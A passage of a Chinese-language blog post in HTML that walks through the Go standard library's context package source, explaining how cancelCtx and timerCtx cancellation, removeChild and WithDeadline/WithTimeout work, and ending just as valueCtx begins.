timerCtx 或 自定义的 cancelCtx 且未重写 Done ()，</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>    <span class=\"token comment\">// 这种情况下可以认为拿到了底层的 *cancelCtx</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>    <span class=\"token comment\">// </span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre>    <span class=\"token comment\">// 不一致情况说明 parent context 是一个自定义的 cancelCtx 且重写了 Done () 方法，并且并未返回标准 *cancelCtx 的</span></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>    <span class=\"token comment\">// 的 done channel，这种情况需要单独处理，故返回 nil, false</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>    pdone<span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">:=</span> p<span class=\"token punctuation\">.</span>done<span class=\"token punctuation\">.</span><span class=\"token function\">Load</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>    <span class=\"token keyword\">if</span> pdone <span class=\"token operator\">!=</span> done <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">false</span></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>    <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span></pre></td></tr><tr><td data-num=\"97\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"取消-cancelctx\"><a class=\"anchor\" href=\"#取消-cancelctx\">#</a> 取消 cancelCtx</h2>\n<p>cancelCtx 内部跨多个 Goroutine 实现信号传递其实靠的就是一个 done channel；<strong>如果要取消这个 Context，那么就需要让所有  <code>&lt;-c.Done()</code>  停止阻塞，这时候最简单的办法就是把这个 channel 直接 close 掉，或者干脆换成一个已经被 close 的 channel</strong></p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//canceler 是一种可以直接取消的 context 类型。其实现是 *cancelCtx 和 *timerCtx。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">type</span> canceler <span class=\"token keyword\">interface</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token function\">cancel</span><span class=\"token punctuation\">(</span>removeFromParent <span class=\"token builtin\">bool</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">,</span> cause <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token function\">Done</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;-</span><span class=\"token keyword\">chan</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">//cancel 关闭 c.done，取消 c 的每个 child，如果 removeFromParent 为 true，则从 parent 的 childen 中删除 c。</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">// 如果这是第一次取消 c，cancel 会将 c.cause 设置为 cause。</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>cancelCtx<span class=\"token punctuation\">)</span> <span class=\"token function\">cancel</span><span class=\"token punctuation\">(</span>removeFromParent <span class=\"token builtin\">bool</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">,</span> cause <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> err <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">panic</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"context: internal error: missing cancel error\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> cause <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        cause <span class=\"token operator\">=</span> err</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token comment\">// 对 context 加锁，防止并发更改</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    c<span class=\"token punctuation\">.</span>mu<span class=\"token punctuation\">.</span><span class=\"token function\">Lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token comment\">// 如果加锁后有并发访问，那么二次判断 err 可以防止重复 cancel 调用</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        c<span class=\"token punctuation\">.</span>mu<span class=\"token punctuation\">.</span><span class=\"token function\">Unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token comment\">// already canceled</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    c<span class=\"token punctuation\">.</span>err <span class=\"token operator\">=</span> err</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    c<span class=\"token punctuation\">.</span>cause <span class=\"token operator\">=</span> cause</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    d<span class=\"token punctuation\">,</span> <span class=\"token boolean\">_</span> <span class=\"token operator\">:=</span> c<span class=\"token punctuation\">.</span>done<span class=\"token punctuation\">.</span><span class=\"token function\">Load</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">chan</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">if</span> d <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token comment\">// 如果 done channel 为 nil，那么就把它设置成共享可重用的一个已经被关闭的 channel</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        c<span class=\"token punctuation\">.</span>done<span class=\"token punctuation\">.</span><span class=\"token function\">Store</span><span class=\"token punctuation\">(</span>closedchan<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token comment\">// 如果 done channel 已经被初始化，则直接 close 它</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token function\">close</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">for</span> child <span class=\"token operator\">:=</span> <span class=\"token keyword\">range</span> c<span class=\"token punctuation\">.</span>children <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token comment\">// NOTE: 持有 parent 锁的同时，获取 child 的锁</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        child<span class=\"token punctuation\">.</span><span class=\"token function\">cancel</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">,</span> cause<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    c<span class=\"token punctuation\">.</span>children <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    c<span class=\"token punctuation\">.</span>mu<span class=\"token punctuation\">.</span><span class=\"token function\">Unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  <span class=\"token comment\">// 如果 removeFromParent 为 true，那么从 parent Context 中清理掉自己</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token keyword\">if</span> removeFromParent <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token function\">removeChild</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token comment\">// 从 parent 中删除 一个 context</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">removeChild</span><span class=\"token punctuation\">(</span>parent Context<span class=\"token punctuation\">,</span> child canceler<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    <span class=\"token keyword\">if</span> s<span class=\"token punctuation\">,</span> ok <span class=\"token operator\">:=</span> parent<span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>stopCtx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> ok <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        s<span class=\"token punctuation\">.</span><span class=\"token function\">stop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    p<span class=\"token punctuation\">,</span> ok <span class=\"token operator\">:=</span> <span class=\"token function\">parentCancelCtx</span><span class=\"token punctuation\">(</span>parent<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token operator\">!</span>ok <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    p<span class=\"token punctuation\">.</span>mu<span class=\"token punctuation\">.</span><span class=\"token function\">Lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token keyword\">if</span> p<span class=\"token punctuation\">.</span>children <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>        <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>children<span class=\"token punctuation\">,</span> child<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    p<span class=\"token punctuation\">.</span>mu<span class=\"token punctuation\">.</span><span class=\"token function\">Unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"timerctx-2\"><a class=\"anchor\" href=\"#timerctx-2\">#</a> timerCtx</h1>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">type</span> timerCtx <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    cancelCtx</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    timer <span class=\"token operator\">*</span>time<span class=\"token punctuation\">.</span>Timer <span class=\"token comment\">// Under cancelCtx.mu.</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    deadline time<span class=\"token punctuation\">.</span>Time</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"创建timerctx\"><a class=\"anchor\" href=\"#创建timerctx\">#</a> 创建 timerCtx</h2>\n<p>timerCtx 的创建主要通过  <code>context.WithDeadline</code>  方法，</p>\n<p>同时  <code>context.WithTimeout</code>  、  <code>WithTimeoutCause</code>  实际上也是调用的  <code>context.WithDeadlineCause</code> :</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// WithTimeout returns WithDeadline(parent, time.Now().Add(timeout)).</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">//cancel 此 context 会释放与其相关的资源，因此代码应在此 context 中运行的操作完成后立即调用取消。</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">WithTimeout</span><span class=\"token punctuation\">(</span>parent Context<span class=\"token punctuation\">,</span> timeout time<span class=\"token punctuation\">.</span>Duration<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>Context<span class=\"token punctuation\">,</span> CancelFunc<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">WithDeadline</span><span class=\"token punctuation\">(</span>parent<span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>timeout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// WithTimeoutCause 的行为与 [WithTimeout] 类似，但也会在超时时设置返回 Context 的 cause。返回的 [CancelFunc] 不会设置原因。</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">WithTimeoutCause</span><span class=\"token punctuation\">(</span>parent Context<span class=\"token punctuation\">,</span> timeout time<span class=\"token punctuation\">.</span>Duration<span class=\"token punctuation\">,</span> cause <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>Context<span class=\"token punctuation\">,</span> CancelFunc<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">WithDeadlineCause</span><span class=\"token punctuation\">(</span>parent<span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Now</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">Add</span><span class=\"token punctuation\">(</span>timeout<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> cause<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">// WithDeadline 返回 parent context 的副本，deadline 调整为不晚于 d</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\">// 如果 parent context 的 deadline 已经早于 d，则 WithDeadline (parent, d) 在语义上等同于父 context。</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\">// 返回的 [Context.Done] channel 会在 deadline 到期、调用返回的取消函数或 parent context 的 Done 通道关闭时关闭 (以先发生者为准)。</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">WithDeadline</span><span class=\"token punctuation\">(</span>parent Context<span class=\"token punctuation\">,</span> d time<span class=\"token punctuation\">.</span>Time<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>Context<span class=\"token punctuation\">,</span> CancelFunc<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">WithDeadlineCause</span><span class=\"token punctuation\">(</span>parent<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">// WithDeadlineCause 的行为与 [WithDeadline] 类似，但会在超过 deadline 时设置返回 Context 的 cause。返回的 [CancelFunc] 不会设置原因。</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token function\">WithDeadlineCause</span><span class=\"token punctuation\">(</span>parent Context<span class=\"token punctuation\">,</span> d time<span class=\"token punctuation\">.</span>Time<span class=\"token punctuation\">,</span> cause <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>Context<span class=\"token punctuation\">,</span> CancelFunc<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">if</span> parent <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token function\">panic</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"cannot create context from nil parent\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">if</span> cur<span class=\"token punctuation\">,</span> ok <span class=\"token operator\">:=</span> parent<span class=\"token punctuation\">.</span><span class=\"token function\">Deadline</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> ok <span class=\"token operator\">&amp;&amp;</span> cur<span class=\"token punctuation\">.</span><span class=\"token function\">Before</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token comment\">// 目前的日期已经早于新的截止日期</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token function\">WithCancel</span><span class=\"token punctuation\">(</span>parent<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    c <span class=\"token operator\">:=</span> <span class=\"token operator\">&amp;</span>timerCtx<span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        deadline<span class=\"token punctuation\">:</span> d<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    c<span class=\"token punctuation\">.</span>cancelCtx<span class=\"token punctuation\">.</span><span class=\"token function\">propagateCancel</span><span class=\"token punctuation\">(</span>parent<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    dur <span class=\"token operator\">:=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">Until</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">if</span> dur <span class=\"token operator\">&lt;=</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        c<span class=\"token punctuation\">.</span><span class=\"token function\">cancel</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> DeadlineExceeded<span class=\"token punctuation\">,</span> cause<span class=\"token punctuation\">)</span> <span class=\"token comment\">//deadline 已经到期</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">return</span> c<span class=\"token punctuation\">,</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">cancel</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> Canceled<span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    c<span class=\"token punctuation\">.</span>mu<span class=\"token punctuation\">.</span><span class=\"token function\">Lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">defer</span> c<span class=\"token punctuation\">.</span>mu<span class=\"token punctuation\">.</span><span class=\"token function\">Unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>err <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        c<span class=\"token punctuation\">.</span>timer <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span><span class=\"token function\">AfterFunc</span><span class=\"token punctuation\">(</span>dur<span class=\"token punctuation\">,</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>            c<span class=\"token punctuation\">.</span><span class=\"token function\">cancel</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> DeadlineExceeded<span class=\"token punctuation\">,</span> cause<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token keyword\">return</span> c<span class=\"token punctuation\">,</span> <span class=\"token keyword\">func</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> c<span class=\"token punctuation\">.</span><span class=\"token function\">cancel</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> Canceled<span class=\"token punctuation\">,</span> <span class=\"token boolean\">nil</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"取消-timerctx\"><a class=\"anchor\" href=\"#取消-timerctx\">#</a> 取消 timerCtx</h2>\n<p>调用一下里面的 cancelCtx 的 cancel，然后再把定时器停掉:</p>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">func</span> <span class=\"token punctuation\">(</span>c <span class=\"token operator\">*</span>timerCtx<span class=\"token punctuation\">)</span> <span class=\"token function\">cancel</span><span class=\"token punctuation\">(</span>removeFromParent <span class=\"token builtin\">bool</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">,</span> cause <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    c<span class=\"token punctuation\">.</span>cancelCtx<span class=\"token punctuation\">.</span><span class=\"token function\">cancel</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">,</span> err<span class=\"token punctuation\">,</span> cause<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">if</span> removeFromParent <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token comment\">// Remove this timerCtx from its parent cancelCtx's children.</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token function\">removeChild</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>cancelCtx<span class=\"token punctuation\">.</span>Context<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    c<span class=\"token punctuation\">.</span>mu<span class=\"token punctuation\">.</span><span class=\"token function\">Lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">if</span> c<span class=\"token punctuation\">.</span>timer <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        c<span class=\"token punctuation\">.</span>timer<span class=\"token punctuation\">.</span><span class=\"token function\">Stop</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        c<span class=\"token punctuation\">.</span>timer <span class=\"token operator\">=</span> <span class=\"token boolean\">nil</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    c<span class=\"token punctuation\">.</span>mu<span class=\"token punctuation\">.</span><span class=\"token function\">Unlock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h1 id=\"valuectx-2\"><a class=\"anchor\" href=\"#valuectx-2\">#</a> valueCtx</h1>\n<figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">type</span> valueCtx <span class=\"token keyword\">struct</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    Context</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    key<span class=\"token punctuation\">,</span> val any</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight go\"><figcaption data-lang=\"go\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// WithValue 返回 parent 的副本，其中与 key 关联的值为 val。</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 用 context 的值仅用于传输进程和 API 